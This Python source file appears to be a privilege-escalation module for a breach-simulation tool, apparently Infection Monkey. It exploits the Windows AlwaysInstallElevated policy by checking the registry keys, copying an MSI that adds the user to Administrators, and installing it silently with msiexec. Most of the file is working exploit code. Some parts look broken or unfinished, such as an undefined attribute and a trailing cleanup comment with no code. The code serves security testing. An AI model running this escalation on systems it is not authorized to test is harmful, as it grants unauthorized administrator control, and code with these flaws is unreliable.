"""
    Implementation is based on Microsoft Windows - AlwaysInstallElevated MSI
    https://www.exploit-db.com/exploits/23007
"""
import os
import shutil
import ctypes
import tempfile
import subprocess
from _winreg import *
from infection_monkey.pe import HostPrivExploiter
from infection_monkey.pe.tools import shell, check_system, check_running
from infection_monkey.utils import user_token_is_admin
from logging import getLogger

LOG = getLogger(__name__)
__author__ = "D3fa1t"
MSI_FILENAME = "addUserToAdministrators.msi"
Registry_HKEY_LOCAL_MACHINE = ConnectRegistry(None, HKEY_LOCAL_MACHINE)
Registry_HKEY_CURRENT_USER = ConnectRegistry(None, HKEY_CURRENT_USER)

def is_set(RawKey):
    try:
        i = 0
        while 1:
            name, value, type = EnumKey(RawKey, i)
            if name == "AlwaysInstallElevated":
                return value
            i += 1
    except WindowsError:
        print()

def get_bin_file_path(filename):
    return os.path.join(os.path.join('.', 'bin'), filename)


class alwaysInstallElevated(HostPrivExploiter):
    def __init__(self):
        self.file_path = ""
        self.file_name = ""
        self.runnableEnv = ("Windows")

    def try_priv_esc(self, command_line):
        """
        The function takes in the command line to run the monkey as an argument
        and tries to run the monkey as a root user.
        :param command_line: The command line to run the monkey in the format {dest_path  MONKEY_ARG  monkey_options}
        :return: True if the pe is successful
        """

        # Check if the exploit can be tried on this distro
        if not check_system(self.runnableDistro):
            return False

        self.file_path = command_line.split(' ')[0]
        self.file_name = self.file_path.split('/')[-1]

        # Check if the current thread is already running with administrator privileges
        if not user_token_is_admin(0):
                # The current user is not running as a admin, check if he belongs to the administrator group
                if ctypes.windll.shell32.IsUserAnAdmin():
                    ctypes.windll.shell32.ShellExecuteW(None, u"runas", command_line, "", None, 1)
                else:
                    # the thread or the user has admin rights
                    RawKey_HKEY_LOCAL_MACHINE = OpenKey(Registry_HKEY_LOCAL_MACHINE,
                                                        "Software\Policies\Microsoft\Windows\Installer")
                    RawKey_HKEY_CURRENT_USER = OpenKey(Registry_HKEY_CURRENT_USER,
                                                       "Software\Policies\Microsoft\Windows\Installer")
                    if is_set(RawKey_HKEY_CURRENT_USER) and is_set(RawKey_HKEY_LOCAL_MACHINE):
                        print "Exploitable"
                        dest_path = tempfile.gettempdir() + "\exploit.msi"
                        source_path = get_bin_file_path(MSI_FILENAME)
                        shutil.copy(source_path, dest_path)

                        subprocess.Popen(["msiexec", "/quiet", "/qn", "/i", dest_path], stdout=subprocess.PIPE)

        # check if the current user is in administrator group
        if not ctypes.windll.shell32.IsUserAnAdmin():
            LOG.info("alwaysInstallElevated Privilege escalation failed!")
            return False

        else:
            # the user is added to the administrator group, run the monkey with admin rights
            ctypes.windll.shell32.ShellExecuteW(None, u"runas", command_line, "", None, 1)

        # remove the user from admin group



